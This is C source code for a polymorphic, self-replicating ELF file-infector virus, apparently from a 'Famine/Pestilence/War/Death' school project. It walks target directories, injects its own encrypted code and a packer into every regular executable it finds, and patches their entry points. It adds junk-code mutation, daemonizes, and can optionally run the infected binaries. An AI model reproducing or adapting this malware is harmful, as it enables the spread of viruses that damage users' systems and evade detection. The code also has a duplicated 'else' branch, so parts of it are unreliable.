#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <elf.h>
#include <dirent.h>

#include "map.h"
#include "utils.h"
#include "bss.h"
#include "text.h"
#include "pestilence.h"
#include "war.h"
#include "daemon.h"
#include "famine.h"
#include "death.h"
#include "syscall.h"

#ifndef PATH1
 #define PATH1 "/tmp/test"
#endif

#ifndef PATH2
 #define PATH2 "/tmp/test2"
#endif

extern void end(void);

void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
void	jmp_end(void);
void	entrypoint(int argc, char **argv, char **envp);
void	_start(void);


#define JMP_SIZE 4

void __attribute__((naked)) _start(void)
{
	__asm__ __volatile__ (
			"push %rdx\n"
			"movq 8(%rsp), %rdi\n"
			"leaq 16(%rsp), %rsi\n"
			"leaq 8(%rsi,%rdi,8), %rdx\n"
			"call entrypoint\n"
			"pop %rdx\n"
			".global jmp_end\n"
			"jmp_end:\n"
			"jmp end\n"
	);
}

void junk_famine(void) {
	const char msg[] = "hello junk";
	uint8_t data[64] = {0};
	size_t len = ft_strlen(msg);

	const uint32_t k[64] = {
		0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
		0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
		0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
		0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
		0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
		0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
		0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
		0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
		0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
		0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
		0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
		0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
		0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
		0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
		0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
		0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
	};

	ft_memcpy(data, msg, len);
	data[len] = 0x80;
	uint64_t bitlen = len * 8;
	data[63] = bitlen;

	uint32_t w[64] = {0};
	for (int i = 0; i < 16; ++i) {
		w[i] = (data[i*4] << 24) | (data[i*4+1] << 16) | (data[i*4+2] << 8) | (data[i*4+3]);
	}
	for (int i = 16; i < 64; ++i) {
		w[i] = ((((w[i - 2]) >> (17)) | ((w[i - 2]) << (32 - (17)))) ^
				(((w[i - 2]) >> (19)) | ((w[i - 2]) << (32 - (19)))) ^
				((w[i - 2]) >> (10))) +
			w[i - 7] +
			((((w[i - 15]) >> (7)) | ((w[i - 15]) << (32 - (7)))) ^
			 (((w[i - 15]) >> (18)) | ((w[i - 15]) << (32 - (18)))) ^
			 ((w[i - 15]) >> (3))) +
			w[i - 16];
	}

	uint32_t a = 0x6a09e667, b = 0xbb67ae85, c = 0x3c6ef372, d = 0xa54ff53a;
	uint32_t e = 0x510e527f, f = 0x9b05688c, g = 0x1f83d9ab, h = 0x5be0cd19;

	for (int i = 0; i < 64; ++i) {
		uint32_t t1 = h +
			((((e) >> (6)) | ((e) << (32 - (6)))) ^
			 (((e) >> (11)) | ((e) << (32 - (11)))) ^
			 (((e) >> (25)) | ((e) << (32 - (25))))) +
			(((e) & (f)) ^ (~(e) & (g))) + k[i] + w[i];
		uint32_t t2 = ((((a) >> (2)) | ((a) << (32 - (2)))) ^
				(((a) >> (13)) | ((a) << (32 - (13)))) ^
				(((a) >> (22)) | ((a) << (32 - (22))))) +
			(((a) & (b)) ^ ((a) & (c)) ^ ((b) & (c)));
		h = g;
		g = f;
		f = e;
		e = d + t1;
		d = c;
		c = b;
		b = a;
		a = t1 + t2;
	}

	volatile uint32_t digest[8] = {
		a + 0x6a09e667, b + 0xbb67ae85, c + 0x3c6ef372, d + 0xa54ff53a,
		e + 0x510e527f, f + 0x9b05688c, g + 0x1f83d9ab, h + 0x5be0cd19
	};
	(void)digest;
}

int __attribute__((section(".text#"))) g_start_offset = 0x1000;
int64_t __attribute__((section(".text#"))) g_key = 0x0;

static int	patch_new_file(data_t *data, const char *filename) { JUNK;

	unlink(filename); JUNK;

	int fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1) {
		return 1; JUNK;
	}

	if (write(fd, data->file, data->size) == -1) {
		close(fd);
		return 1;
	} JUNK;

	close(fd);

	return 0;
}

static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
	return (int64_t)to - (int64_t)from - (int64_t)offset;
}

static int packer(data_t *data) {
	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start; JUNK;

	if (text(data, data->packer.p_size) != 0) {
		return 1;
	}

	return 0;
}

static void init_patch(data_t *data, size_t jmp_rel_offset) {

	patch_t *patch = &data->patch; JUNK;

	/* calculate the difference between the cave and the packer 
	 * will always be positive cause .data is after the .text */
	uint32_t addr_diff = data->cave.addr - data->packer.addr;

	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);

	char signature[SIGNATURE_SIZE]; JUNK;

	ft_strncpy(signature, sign, SIGNATURE_SIZE);

	/* "Famine (c)oded by dxrxbxk - straboul:numb", 0x0a, 0 
	 * reset the hash (numb) to 0000 */
	ft_memset(&signature[SIGNATURE_SIZE - 6], '0', 4);

	update_fingerprint(&signature[ft_strlen(signature) - 14], data);

	ft_strncpy(patch->signature, signature, sizeof(patch->signature)); JUNK;

	patch->decrypt_size = data->cave.p_size;

	patch->virus_offset = addr_diff;

	patch->key = gen_key_64();

	g_key = patch->key;
}

static int packer_patch(data_t *data) {

	uint16_t jmp_rel_offset = (uintptr_t)&jmp_rel - (uintptr_t)&packer_start; JUNK;

	init_patch(data, jmp_rel_offset);

	uintptr_t pstart = (uintptr_t)&packer_start;

	/* copy the packer */
	ft_memcpy(data->file + data->packer.offset, (void*)pstart, data->packer.p_size); JUNK;

	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(patch_t));

	return 0;

}

static int	inject(data_t *data) {

	if (packer(data) != 0) {
		return 1;
	} JUNK;

	if (bss(data, data->cave.p_size) != 0) {
		return 1;
	} JUNK;

	packer_patch(data);

	uint16_t jmp_offset = (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;

	uintptr_t start = (uintptr_t)&_start;

	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, jmp_offset + JMP_SIZE);

	ft_memcpy(data->file + data->cave.offset, (void*)start, data->cave.p_size);

	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE); JUNK;

	encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);

	return 0;
}

static int	infect(const char *filename, bootstrap_data_t *bs_data)
{

	data_t data;
	ft_memset(&data, 0, sizeof(data_t)); JUNK;

	/* copy the name of the target */
	ft_strncpy(data.target_name, filename, sizeof(data.target_name));

	/* get our own name */
	data.bs_data = bs_data;

	/* calculate the size of the payload before the mapping */
	data.cave.p_size = (uintptr_t)&end - (uintptr_t)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	} JUNK;

	if (update_hdr(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		free_data(&data);
		return 1;
	} JUNK;

	if (patch_new_file(&data, filename) != 0) {
		free_data(&data);
		return 1;
	}

	free_data(&data);

	return 0;
}


#ifdef ENABLE_EXEC
static int execute_prog(const char *filename, char **envp)
{
	pid_t pid = fork(); JUNK;

	if (pid == 0) {

		const char dev_null[] = "/dev/null";
		int fd = open(dev_null, O_RDONLY); JUNK;

		if (fd == -1)
			return 1;

		if (dup2(fd, 0) < 0) {
			close(fd);
			return 1;
		}
		if (dup2(fd, 1) < 0) {
			close(fd);
			return 1;
		}
		if (dup2(fd, 2) < 0) {
			close(fd);
			return 1;
		}

		close(fd);

		execve(filename, (const char *[]){filename, NULL}, envp);

		exit(0);
	} else if (pid > 0) {
		siginfo_t info;

		waitid(P_PID, pid, &info, WEXITED);

		return (info.si_status == 0) ? 0 : 1;
	} else {
		return 1;
	} else {
		return 1;
	}
	return 0;
}
#endif

static void	make_path(char *path, const char *dir, const char *file)
{
	char *ptr = path;
	char slash[] = "/";
	ptr = ft_stpncpy(ptr, dir, PATH_MAX - (ptr - path));
	ptr = ft_stpncpy(ptr, slash, PATH_MAX - (ptr - path));
	ft_stpncpy(ptr, file, PATH_MAX - (ptr - path));
}

static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *counter)
{

	int fd = open(file, O_RDONLY);
	if (fd == -1)
		return ;

	char buf[PATH_MAX];
	dirent_t *dir;
	ssize_t ret;

	for(;;)
	{
		ret = getdents64(fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (dirent_t *)(buf + i); JUNK;

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {
				char new_path[PATH_MAX]; JUNK;

				make_path(new_path, file, dir->d_name);

				if (infect(new_path, bs_data) == 0) {
					(*counter)++;
					mutate();

#ifdef ENABLE_EXEC
					execute_prog(new_path, bs_data->envp);
#endif
				}

			} else if (dir->d_type == DT_DIR) {
				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name); JUNK;

				open_file(new_path, bs_data, counter);
			}
		}
	}

	close(fd);
}

void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
{

	const char *paths[] = {
		STR(PATH1),
		STR(PATH2),
		STR("./tmp"),
		NULL
	};

	JUNK;

	for (int i = 0; paths[i]; ++i)
		open_file(paths[i], bs_data, counter);

}

void	entrypoint(int argc, char **argv, char **envp)
{
	bootstrap_data_t bootstrap_data;
	bootstrap_data.argc = argc;
	bootstrap_data.argv = argv;
	bootstrap_data.envp = envp;
	uint16_t counter = 0;

	file_t file;
	ft_memset(&file, 0, sizeof(file_t));

#ifndef DEV_MODE
	//if (pestilence() != 0) {
	//	return ;
	//}
#endif

	int start_offset = g_start_offset;
	int64_t key = g_key;

	prepare_mutate();
	mutate();

	daemonize(envp);

	famine(&bootstrap_data, &counter);
	war(counter, &file);
	death(start_offset, key, &file);
}
